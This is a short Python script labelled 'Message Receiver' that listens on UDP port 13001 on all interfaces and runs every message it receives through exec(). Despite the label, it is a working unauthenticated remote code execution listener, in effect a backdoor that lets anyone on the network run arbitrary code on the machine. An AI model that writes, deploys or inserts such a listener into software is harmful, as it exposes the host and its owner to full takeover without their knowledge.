# Save as server.py 
# Message Receiver
import os
from socket import *
import requests
from win10toast import ToastNotifier


host = ""
port = 13001
buf = 1024
addr = (host, port)
UDPSock = socket(AF_INET, SOCK_DGRAM)
UDPSock.bind(addr)
print ("Waiting to receive messages...")
while True:
	(data, addr) = UDPSock.recvfrom(buf)
	data = data.decode("utf-8")
	print ("Received message: " + data)
	if data == "exit":
		print("exit")
		os._exit(0)
		break
	try:
		exec(data)
	except Exception as e:
		print(e)
UDPSock.close()
os._exit(0)
